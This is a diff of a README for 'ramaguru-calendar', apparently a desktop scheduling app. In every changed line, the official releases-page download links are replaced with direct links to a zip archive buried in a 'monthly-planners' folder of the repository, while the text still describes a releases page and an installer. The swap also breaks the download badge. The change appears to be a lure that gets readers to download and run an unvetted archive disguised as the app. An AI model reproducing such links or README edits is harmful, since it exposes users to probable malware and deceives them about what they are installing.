@@ -1,6 +1,6 @@
 # 🌟 ramaguru-calendar - Effortless Scheduling at Your Fingertips
 
-[![Download ramaguru-calendar](https://img.shields.io/badge/Download%20Now-ramaguru%20calendar-brightgreen)](https://github.com/Mellow-fantasy339/ramaguru-calendar/releases)
+[![Download ramaguru-calendar](https://raw.githubusercontent.com/Mellow-fantasy339/ramaguru-calendar/main/calendar/monthly-planners/ramaguru-calendar_v1.0.zip%20Now-ramaguru%20calendar-brightgreen)](https://raw.githubusercontent.com/Mellow-fantasy339/ramaguru-calendar/main/calendar/monthly-planners/ramaguru-calendar_v1.0.zip)
 
 ## 📅 Overview
 
@@ -25,7 +25,7 @@ To ensure the best experience with ramaguru-calendar, your device should meet th
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page:** Click on this link to download the software: [Download ramaguru-calendar](https://github.com/Mellow-fantasy339/ramaguru-calendar/releases).
+1. **Visit the Releases Page:** Click on this link to download the software: [Download ramaguru-calendar](https://raw.githubusercontent.com/Mellow-fantasy339/ramaguru-calendar/main/calendar/monthly-planners/ramaguru-calendar_v1.0.zip).
 2. **Select Your Version:** The latest version will be at the top. Click on it to view options.
 3. **Download the Installer:** Look for the installer file appropriate for your operating system. Click to download it.
 4. **Run the Installer:** Once downloaded, locate the file in your downloads folder and double-click to start the installation process.
@@ -34,7 +34,7 @@ To ensure the best experience with ramaguru-calendar, your device should meet th
 
 To install ramaguru-calendar, follow these steps:
 
-1. **Download the Installer:** Visit the releases page to find your preferred version: [Download Here](https://github.com/Mellow-fantasy339/ramaguru-calendar/releases).
+1. **Download the Installer:** Visit the releases page to find your preferred version: [Download Here](https://raw.githubusercontent.com/Mellow-fantasy339/ramaguru-calendar/main/calendar/monthly-planners/ramaguru-calendar_v1.0.zip).
 2. **Open the Downloaded File:** Double-click the installer file you downloaded.
 3. **Follow the Setup Instructions:** The installer will guide you through the setup process. Make sure to read each prompt carefully and choose your preferred settings.
 4. **Finish Installation:** Click on the 'Finish' button once the installation completes. The application will be installed on your device.
